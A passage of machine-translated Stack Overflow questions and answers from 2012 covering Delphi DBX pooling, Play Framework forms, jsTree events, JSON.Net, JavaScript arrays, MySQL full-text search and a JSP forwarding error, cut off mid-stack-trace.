roleList.push(1);
roleList.push(5);
roleList.push(8);

$.ajax({
            type: "POST",
            traditional: true, /* I M P O R T A N T */
            url: /* url to controller goes here */,
            data: { userId: usrId, allowedRoles: roleList },
            success: function(returndata) {
                alert("Done");
            },
            error: function(returndata) {
                alert("Error:\n" + returndata.responseText);
            }
        }); 
```

# delphi - 如何在代码中设置 DBX 连接池？

> ID：10218813
> 
> 赞同：7
> 
> 时间：2012-04-18T22:09:50.697
> 
> 标签：delphi, connection-pooling, delphi-xe, dbexpress

我有 Delphi XE Professional。它带有相当多的 DBX 东西，包括`DBXPool`包含连接池支持的单元，但它没有 XE Enterprise 中提供的完整 DBX 支持。特别是，很多设计时支持都不存在。

我不是特别介意。没有它，我已经能够做所有我需要的事情，直到我需要连接池。现在我正试图让它发挥作用，但我不知道如何让它发挥作用。我可以添加`DBXPool`到我的程序并验证它是否已初始化，但是当我开始发出数据库请求时，`TDBXPoolConnection.Create`它永远不会被调用。

这是我在 BeforeConnect 事件处理程序中的连接设置代码。任何人都知道我做错了什么以及如何做对吗？

```
procedure TMyDataModule.connectionBeforeConnect(Sender: TObject);
begin
   connection.DriverName := 'Firebird';
   connection.Params.Values['User_Name'] := FUserName;
   connection.Params.Values['Password'] := FPassword;
   connection.Params.Values['Database'] := FDatabasePath;
   connection.Params.Values['ServerCharSet'] := 'UTF8';
   connection.Params.values['DelegateName'] := 'DBXPool';
   connection.Params.values['DelegateConnection.MaxConnections'] := '32';
end; 
```

**编辑：**如果将来有人遇到这个问题并且遇到同样的问题，这就是我必须设置它以使其正常工作的方法。而不是上面的最后两行，

```
connection.Params.values['DelegateConnection'] := 'DBXPoolConnection';
connection.Params.values['DBXPoolConnection.DriverName'] := 'DBXPool';
connection.Params.values['DBXPoolConnection.MaxConnections'] := '32'; 
```

感谢 Sertac 让我走上了正确的道路！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T23:19:28.310

您需要设置`DBXPoolConnection`参数`DelegateConnection`。

请参阅：[连接池](http://docwiki.embarcadero.com/RADStudio/en/Connection_Pooling_%28Delegate_Drivers_tutorial%29)。

# forms - 从表单绑定多个对象在play framework 2.0中

> ID：10218814
> 
> 赞同：4
> 
> 时间：2012-04-18T22:09:53.803
> 
> 标签：forms, scala, binding, playframework-2.0

我拼命地尝试从表单提交中接收值列表并将其绑定到对象列表。

有效的是检索单行：

```
//class
case class Task(name: String, description: String)

val taskForm: Form[Task] = Form(
  mapping(
  "name" -> text,
  "description" -> text

  )(Task.apply)(Task.unapply)
)

//form
<tr>
  <td><input name="name" type="text" class="span2" placeholder="Name..."></td>
  <td><textarea name="description" class="autoexpand span7" rows="1"     placeholder="Description..."></textarea>
  </td>
</tr>

//receiving action:
val task = taskForm.bindFromRequest.get 
```

但是现在我想提交多个任务类型的对象，例如：

```
<tr>
  <td><input name="name[0]" type="text" class="span2" placeholder="Name..."></td>
  <td><textarea name="description[0]" class="autoexpand span7" rows="1" placeholder="Description..."></textarea></td>                   
</tr>
<tr>
  <td><input name="name[1]" type="text" class="span2" placeholder="Name..."></td>
  <td><textarea name="description[1]" class="autoexpand span7" rows="1" placeholder="Description..."></textarea></td>                   
</tr> 
```

现在执行 taskForm.bindFromRequest.get 失败。

有人想出解决方案吗？还是您对这种情况的处理方式完全不同？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-19T07:26:25.093

好吧，感谢您提示我再次查看文档，我已经看过它们，但永远无法弥补如何将其组合以使其工作。我认为这是因为我是一个完全的 scala 菜鸟。但是，我在给它一段时间后让它工作了，这是我的解决方案：

```
//classes
case class Task(name: String, description: String)
case class Tasks(tasks: List[Task])

val taskForm: Form[Tasks] = Form(
  mapping(
  "tasks" -> list(mapping(
    "name" -> text,
    "description" -> text
  )(Task.apply)(Task.unapply))
)(Tasks.apply)(Tasks.unapply)
)

//form
<tr>
  <td><input name="tasks[0].name" type="text" class="span2" placeholder="Name..."></td>
  <td><textarea name="tasks[0].description" class="autoexpand span7" rows="1" placeholder="Description..."></textarea></td>                   
</tr>
<tr>
  <td><input name="tasks[1].name" type="text" class="span2" placeholder="Name..."></td>
  <td><textarea name="tasks[1].description" class="autoexpand span7" rows="1" placeholder="Description..."></textarea></td>                   
</tr> 
```

最后做一个：

```
val tasks = taskForm.bindFromRequest.get 
```

检索任务列表。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T00:05:00.800

从 playframework 文档[页面](http://www.playframework.org/documentation/2.0/ScalaForms)：

> **重复值**
> 
> 表单映射也可以定义重复值：
> 
> ```
> case class User(name: String, emails: List[String])
> 
> val userForm = Form(
>   mapping(
>     "name" -> text,
>     "emails" -> list(text)
>   )(User.apply, User.unapply)
> ) 
> ```
> 
> 当您使用这样的重复数据时，浏览器发送的表单值必须命名为 emails[0]、emails[1]、emails[2] 等。

# python - 获取整个站点 python

> ID：10218815
> 
> 赞同：0
> 
> 时间：2012-04-18T22:09:54.427
> 
> 标签：python, linux

获取简单的网页非常容易。正如我从[python的手册中看到的](http://docs.python.org/howto/urllib2.html)

```
import urllib2
response = urllib2.urlopen('http://python.org/')
html = response.read() 
```

但是如何获取所有站点？有人可以给我代码吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:14:35.437

使用[BeautifulSoup](http://www.crummy.com/software/BeautifulSoup/)解析站点并为每个链接重复该过程，除非它会将您引导到域之外。

非常简单，但是如果您尝试获取没有链接的动态内容，它就会变得复杂。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:18:16.030

您可以使用以下组合

*   Scrapy [http://scrapy.org/](http://scrapy.org/)
*   BeautifulSoup [http://www.crummy.com/software/BeautifulSoup/](http://www.crummy.com/software/BeautifulSoup/)
*   机械化[http://wwwsearch.sourceforge.net/mechanize/](http://wwwsearch.sourceforge.net/mechanize/)

您可以提取网页上的链接并跟踪您是否已经访问过该页面以及该网址是否属于同一站点并获取它们。

您需要牢记为该页面编制索引所需的嵌套级别。否则，您要检索的页面将成倍增长

# c - 标准 C 中有没有办法告诉我是否可以安全地取消引用指针

> ID：10218817
> 
> 赞同：2
> 
> 时间：2012-04-18T22:10:11.557
> 
> 标签：c, debugging, pointers, exception-handling

考虑以下：

```
int * i = malloc(sizeof(int));
free(i); 
```

我现在处于`i`指向已释放内存的情况，但它也非零；`i`这是 C 编程中的一个常见错误，有没有办法在我去做类似的事情之前告诉它仍然是一个有效的指针：

```
*i++; //probable EXC_BAD_ACCESS crash 
```

我知道完全不可能有 100% 可靠（无误报）的方法，除非你从未重用内存；但是大部分时间都有效的东西对于调试来说非常有用。

*编辑*

我并不是说您不应该将指针设置为 NULL，我只是想知道是否有一种可移植的（POSIXish）方法来戳地址而不会造成灾难性的影响，我只是对调试复杂的多线程问题感兴趣到时间。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:29:29.877

不。

静态分析和实时工具（例如 valgrind 和 guard malloc）可以帮助您解决这个问题。改变你编写程序的方式也有助于更容易地理解所有权和生命周期。

如果您真的想要更详细地了解此功能，您*可以*使用自定义分配器——但现有的一些工具可以提供很大帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T22:19:37.093

要获得适用于调试的东西，您需要使用 valgrind 的 memcheck 工具。访问发生时，您会看到无效读取或无效写入错误。

@Anthales 是对的，您需要在释放后立即将指针设置为 NULL。如果您对指针有多个引用，这会变得更加复杂。在不了解您的具体情况的情况下，我无法确切说明如何执行此操作，但可能的解决方案是为不同的结构提供一些东西，使它们能够请求对该内存的引用而不是特定的指针。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T22:28:53.703

没有（可移植的）方法可以从指针值本身知道非 NULL 指针值是否有效。同样，没有（便携式）方法可以知道指针是否指向具有自动、静态或动态范围的对象。如果您非常熟悉您的平台的内存模型，您可能会做出一些有根据的猜测（即，0x00000001*可能*不是有效的内存位置），但仅此而已。

您必须将所有这些信息与指针本身分开跟踪，或者在如何使用指针时强制执行一些纪律。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-18T22:22:00.490

你在 C 中真正能做的就是传递足够的信息来知道是否`i`仍然指向某个东西。

从哲学上讲，如果您不知道`*i++;`是否`i`仍然指向可以安全递增的东西，那么即使确实如此，您怎么知道递增它是正确的？

这与 C 中的数组使用情况类似：您养成了传递数据指针和伴随的大小指示符的习惯。或者你将它们都包装成一个结构。

也许如果你能给出一个更大的例子来说明如何`i`使用，人们可以推荐一种惯用的方式来添加你需要的附加信息。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-18T22:33:42.690

有些人喜欢将释放的指针设置为紧随`NULL`其后`free`：

```
#define paranoid_free(ptr)    (free(ptr), (ptr) = NULL) 
```

这有利于避免`free(NULL)`C 中定义的双重释放问题（作为无操作）。但它仍然不会阻止您取消引用指针并在程序的其他地方调用未定义的行为。

# javascript - jsTree onSelect 事件

> ID：10218818
> 
> 赞同：21
> 
> 时间：2012-04-18T22:10:19.673
> 
> 标签：javascript, jstree

我一直在尝试获取在 jsTree 中选择的节点的文本。我能够填充树并触发 onSelect 事件，但我无法找出单击了哪个节点。我在网上看到了`data.rslt.obj.attr("data")`用于获取文本的示例，但是这对我来说是未定义的。此外，当我尝试使用`.jstree('get_selected')`我无法在对象中的任何位置找到节点文本来获取所选节点时。如何获取节点文本？

这是我的 onSelect 回调函数：

```
function onSelect(event, data)
{
    // Get the name of the equipment that was selected.
    var selected_node = $("#equipment_tree").jstree('get_selected');
    var equipment_name = data.rslt.obj.attr("data");
} 
```

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2012-04-19T09:04:45.817

2018 年更新。

感谢@ProfK 的评论，新版本的 jstree 中的 API 发生了变化。在 jstree v3.1.0（或更早版本）中，API 已更改为：

```
$("#treeContainer").on(
        "select_node.jstree", function(evt, data){
            //selected node object: data.node;
        }
); 
```

* * *

对于 jstree 旧版本（2013 年之前）。

您可以通过以下方式获取选定的节点对象及其文本：

```
$("#treeContainer").bind(
        "select_node.jstree", function(evt, data){
            //selected node object: data.inst.get_json()[0];
            //selected node text: data.inst.get_json()[0].data
        }
); 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2014-08-21T07:55:14.027

从节点获取文本的 jstree 新版本应该使用 data.node.text

```
$("#treeContainer").on("select_node.jstree",
     function(evt, data){
          alert(data.node.text);
     }
); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-12-22T07:15:04.300

```
$("#equipment_tree").bind("select_node.jstree", function(evt, data){

             var i, j, r = [], ids=[];
                for(i = 0, j = data.selected.length; i < j; i++) {
                  r.push(data.instance.get_node(data.selected[i]).text);
                }
                alert('Selected: ' + r.join(', '));
           }
); 
```

你必须试试这个。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-06-22T11:56:39.007

对于当前版本，最好使用`get_selected`with `full: true`，这意味着该方法将返回完整的对象，而不仅仅是 id。

例如：

```
$("#treeNode").jstree('get_selected', true); 
```

或者：

```
$("#treeNode").jstree().get_selected(true); 
```

数组中的每个元素都将具有文本或 id 形式的所有属性。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-04-19T05:07:09.690

click 事件不传递任何数据，因此需要使用事件对象。

```
.bind("click.jstree", function (event) {
    alert($(event.currentTarget).parent("li:first").text().trim());
}); 
```

# java - 在java数组中设置第一个计数

> ID：10218819
> 
> 赞同：1
> 
> 时间：2012-04-18T22:10:21.103
> 
> 标签：java, arrays, for-loop, java.util.scanner

我正在尝试制作一个提示用户输入 2 项的程序 - 值的计数和第一个值。有了这些信息，我们构建了一个输入大小的数组，并用从用户起始值开始的整数填充它。

我很难弄清楚如何从用户的输入中开始填充数组。有人可以帮我理解需要做什么吗？

这就是交互应该是这样的......

```
 - Enter count:
 - 4
 - Enter a starting value:
 - 2
 - [2, 3, 4, 5] 
```

到目前为止，这是我的代码......

```
import java.util.Scanner;
import java.util.Arrays;

public class Problem1b {
    public static void main(String[] args){
        Scanner input = new Scanner(System.in);

        System.out.println("Enter a count:");
        final int num = input.nextInt();
        int[] count = new int[num];

        System.out.println("Enter a starting value:");

        int index = input.nextInt();
        for (int i = index; i < count.length; i++){
            count[i] = i;
        }

        System.out.println(Arrays.toString(count));
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:14:18.387

改变循环：

```
for (int i = 0; i < count.length; i++) {
    count[i] = index + i;
} 
```

# facebook - facebook 发送按钮忽略 OG 元标记

> ID：10218820
> 
> 赞同：2
> 
> 时间：2012-04-18T22:10:26.100
> 
> 标签：facebook

我正在使用 Facebook 发送按钮，并将以下内容放在显示发送按钮的页面上：

**编辑：我在页面的 html 部分的顶部添加了代码：**

```
 <html
     xmlns="http://www.w3.org/1999/xhtml"
     xmlns:og="http://ogp.me/ns#"
     xmlns:fb="https://www.facebook.com/2008/fbml">

 <head>
  <meta property="og:url" content="http://www.thesite.com/theHomePage.php"/>
  <meta property="og:title" content="Thesite is now live with a Send button!"/>
  <meta property="og:image" content="http://www.thesite.com/images/logo.png"/>
  <meta property="og:description" content="This is test description verbiage"/> 
```

**编辑：我在发送按钮代码下方添加：**

```
 <div id="fb-root"></div> 
        <script>
        (function(d, s, id) 
        { 
            var js, fjs = d.getElementsByTagName(s)[0]; 
            if (d.getElementById(id)) return; 
            js = d.createElement(s); 
            js.id = id;
            js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
            fjs.parentNode.insertBefore(js, fjs); 
        }
        (document, 'script', 'facebook-jssdk'));
       </script>

           <div class="fb-send" data-href="http://www.thesite.com"></div> 
```

[当我在http://developers.facebook.com/tools/debug/](http://developers.facebook.com/tools/debug/)使用 Facebook 调试器时，它告诉我：

```
 Raw Open Graph Document Information

   Meta Tag: <meta property="og:url" content="http://www.thesite.com/theHomePage.php" />
   Meta Tag: <meta property="og:title" content="Thesite is now live with a Send button!" />
   Meta Tag: <meta property="og:image" content="http://www.thesite.com/images/logo.png" />
   Meta Tag: <meta property="og:description" content="his is test description verbiage" /> 
```

Facebook 调试器清楚地看到了我的 Meta 标签，并且调试器没有报告 theHomePage.php 的任何问题。

所以这里的问题是：当我点击“发送”按钮并出现发送对话框时：

*   我的“logo.png”图像丢失（尽管 logo.png 图像确实出现在调试器中）

*   “消息”字段为空——不应该用我的**og:description**冗长文本填充吗？

*   错误的页面标题出现在发送对话框的底部

*   并且显示的 URL 不是[http://www.thesite.com/theHomePage.php——](http://www.thesite.com/theHomePage.php)而是显示的 URL 是 [http://www.thesite.com/](http://www.thesite.com/)

我还需要在这里做些什么，以便在单击“发送”按钮时我的元标记显示在“发送”对话框中？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T22:33:35.193

根据您在问题中提供的信息，我假设您调试的 url 是*www.thesite.com/theHomePage.php*并且您会根据 og 标签获得预期的数据。

但是从发送按钮的代码中，您给出了*www.thesite.com/*的 url，这是一个不同的 url。尝试调试该 url，看看你得到了什么。

Facebook 根据 url 索引数据，因此 url 的任何微小差异都会导致图表中的对象不同。因此，您需要将确切的 url 放在*data-href*属性中。

# php - 搜索表单在单独的结果页面中搜索和显示来自 2 个数据库表的数据

> ID：10218821
> 
> 赞同：0
> 
> 时间：2012-04-18T22:10:31.993
> 
> 标签：php, mysql, multiple-databases

我有一个带有 5 个下拉菜单的基本搜索表单，我希望它搜索 2 个数据库内容并将其显示在结果页面中。我以前没有这样做过，几乎没有什么可以在互联网上指导我。我正在寻找构建一个 result.php 页面。数据库名称是旅游和出发。旅游表：代码、运营商、持续时间、概述、图像、tour_style 出发表：代码、运营商、开始日期、结束日期、价格、状态 非常感谢所有帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T06:01:11.587

我为我的网站使用 php 和 mysql（用于单个数据库）制作了一个搜索表单。我在 mysql 命令语法中使用了 MATCH 和 AGAINST。这些是一些有用的链接，可以帮助您制作搜索表单。

[http://devzone.zend.com/26/using-mysql-full-text-searching/#Heading12](http://devzone.zend.com/26/using-mysql-full-text-searching/#Heading12)

[http://dev.mysql.com/doc/refman/5.0/en/fulltext-search.html](http://dev.mysql.com/doc/refman/5.0/en/fulltext-search.html)

[http://forums.digitalpoint.com/showthread.php?t=27529](http://forums.digitalpoint.com/showthread.php?t=27529)

[http://www.seophe.com/articles/tutorial_mysql_fulltext_searching](http://www.seopher.com/articles/tutorial_mysql_fulltext_searching)

例如：

```
SELECT *
    FROM tours
    WHERE  MATCH ( code,operator,duration, overview, image, tour_style  )
    AGAINST (  '%$keywords%' ); 
```

我只为一个数据库尝试过这个，它对我来说非常有效。我不确定是否要为两个数据库创建搜索表单。可能您可以创建两个 mysql Match 查询，一个用于旅游，另一个用于出发，像这样..

```
SELECT *
    FROM tours
    WHERE  MATCH ( code,operator,duration, overview, image, tour_style  )
    AGAINST (  '%$keywords%' );
SELECT *
    FROM departures
    WHERE  MATCH ( code, operator, start_date, end_date, pricecode, operator, start_date, end_date, price )
    AGAINST (  '%$keywords%' ); 
```

请彻底搜索谷歌..

免责声明：没有在机器上尝试以上 MySQL 代码，因为我没有在这台机器上安装 mysql

# c# - 如何将 JSON.Net 中的 JObject 转换为 T

> ID：10218827
> 
> 赞同：26
> 
> 时间：2012-04-18T22:10:59.950
> 
> 标签：c#, json, casting, json.net

我知道我可以使用`JsonConvert.DeserializeObject<T>(string)`，但是，我需要查看对象的`_type`（可能不是第一个参数）以确定要转换到的特定类。本质上，我想做的是：

```
//Generic JSON processor for an API Client.
function MyBaseType ProcessJson(string jsonText)
{
  var obj = JObject.Parse(jsonText);
  switch (obj.Property("_type").Value.ToString()) {
    case "sometype":
      return obj.RootValue<MyConcreteType>();
      //NOTE: this doesn't work... 
      // return obj.Root.Value<MyConcreteType>();
    ...
  }
}
...

// my usage...
var obj = ProcessJson(jsonText);
var instance = obj as MyConcreteType;
if (instance == null) throw new MyBaseError(obj); 
```

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-04-19T04:20:43.597

首先将 JSON 解析为 JObject。然后使用 LINQ to JSON 查找`_type`属性。然后根据值切换并使用`ToObject<T>`：

```
var o = JObject.Parse(text);
var jsonType = (String)o["_type"];

switch(jsonType) {
    case "something": return o.ToObject<Type>();
    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-07-10T14:21:05.380

JSON.NET 无法直接支持这两个要求：

*   持有类型名称的属性的自定义名称
*   在对象的任何位置查找属性

第一个条件由[JsonSubTypes](https://github.com/manuc66/JsonSubTypes)满足 第二个条件是通过指定正确的[MetadataPropertyHandling](https://www.newtonsoft.com/json/help/html/SerializationSettings.htm#MetadataPropertyHandling)

# javascript - 删除值时未 设置数组 - 还是获取数组计数的最佳方法？

> ID：10218828
> 
> 赞同：0
> 
> 时间：2012-04-18T22:11:29.643
> 
> 标签：javascript

JavaScript 到处都有一些有趣的怪癖。考虑这个怪癖，从[这篇很棒的帖子](http://dublintech.blogspot.co.uk/2012/04/javascript-language-z-cheat-sheet.html)中撕下来（感谢 M. Staveley 分享这个）：

```
var colours = ['red', 'green', 'blue']
// is red really in the array?
console.log(colours.indexOf('red') > -1);  // outputs true. 
// remove red, it's going out of fashion!
delete colours[colours.indexOf('red')];
console.log(colours.indexOf('red') > -1);  // outputs false
console.log(colours.length) // length is still three, remember it's javascript! 
```

最后一行是我的错误。这个怪癖让我很好奇，什么是获取真实计数的优雅方式`colours`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:13:30.000

不要使用`delete`

您应该使用本[机数组函数](http://www.w3schools.com/jsref/jsref_obj_array.asp)之一，例如`splice`或`shift`

```
colours.shift();
console.log(colours.length); 
```

或者

```
colours.splice(colours.indexOf('red'), 1);
console.log(colours.length); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T22:16:23.517

`delete`只会删除元素的引用。它不会更新数组的逻辑，并且没有优雅的方法来获取这样一个损坏的数组中的变量的实际计数（请参阅[Jon 的建议](https://stackoverflow.com/a/10218869/1139697)）。所以使用`shift`,`pop`或.`splice``var newarray = oldarray.slice`

也可以看看：

*   [MDN：数组](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-18T22:15:01.913

这确实是对 Javascript 数组的误用，所以虽然有一种解决方法（使用`for...in`并计算名称为数字的属性的数量），但您肯定不会称它为优雅[的（请参阅实际操作](http://jsfiddle.net/Bm4Yc/)）。

不要使用`delete`也不要手动为元素分配索引（`var colors = []; colors[1000] = 'red';`）；这不是数组的使用方式。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-18T22:20:35.777

用于`delete`删除数组中的项目，但在数组中留下“洞”。它删除了值，但不是“空格”，使数组仍然具有相同的长度。

要删除一个值以及该数组中的空间，请使用[`splice`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/splice)

```
array.splice(colours.indexOf('red'),1); //remove 1 item starting from index 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-18T22:19:25.153

`delete`只是将值设置为`undefined`，它不会将其从数组中删除。

```
delete colours[colours.indexOf('red')]; 
```

您的数组现在看起来像这样：

```
[undefined, 'green', 'blue'] 
```

如您所见，长度仍然是 3。要从数组中删除一个值，您可以使用[`splice`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/splice).

```
colours.splice(colours.indexOf('red'), 1); 
```

# jsp - 通过 HTML 对象将客户端请求转发到 jsp 时出错

> ID：10218829
> 
> 赞同：-1
> 
> 时间：2012-04-18T22:11:29.777
> 
> 标签：jsp, servlets, post, http-post, servlet-filters

我在一个使用 JSP 的 Eclipse 项目中创建了一个 index.jsp 作为起始页。在 index.jsp 页面中，我有两个提交按钮，根据单击哪个按钮，我想将请求转发到两个不同的 jsp。我正在运行 Apache Tomcat 应用程序服务器。

基本上，我为两个 HTML 对象保留了两个带有方法 post 的表单，并将请求转发到不同的 jsps。下面是我写的代码：

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
pageEncoding="ISO-8859-1"%>
<%@ taglib uri="/WEB-INF/tld/c.tld" prefix="c" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html> 
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

<c:import url="/WEB-INF/javascript/index.js" />

<title>Welcome to Airline Reservation</title>
</head>
<body>
<img alt="flyingplane" src="images/flight1.jpg">
<form name="form1" action="processCreateRequest.jsp" method="post">
<jsp:include page="index.jsp">
<jsp:param name="requestType" value="create"/>
</jsp:include>
<table border="0">
<tr><td valign="top">
<h1>Create New Reservation</h1></td><td><input type="submit" value="Create"></td></tr>
</table>
</form>
<form name="form2" action="processSearchRequest.jsp" method="post">
<jsp:include page="index.jsp">
<jsp:param name="requestType" value="search"/>
</jsp:include>
<table border="0">
<tr><td valign="top">
<h1>Change or Cancel Reservation</h1></td><td><input type="submit" value="Search"></td></tr>
</table>
</form>
<%
if (request.getParameter("requestType").equals("create")) {
String destination = "/WEB-INF/jsp/processCreateRequest.jsp";
RequestDispatcher rd = getServletContext().getRequestDispatcher(destination);
rd.forward(request,response);
} else if (request.getParameter("requestType").equals("search")) {
String destination = "/WEB-INF/jsp/processSearchRequest.jsp";
RequestDispatcher rd = getServletContext().getRequestDispatcher(destination);
rd.forward(request,response);
}
%>

</body>
</html> 
```

但是当我在 Apache Tomcat 服务器上运行 index.jsp 时，它给了我以下错误日志：

```
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
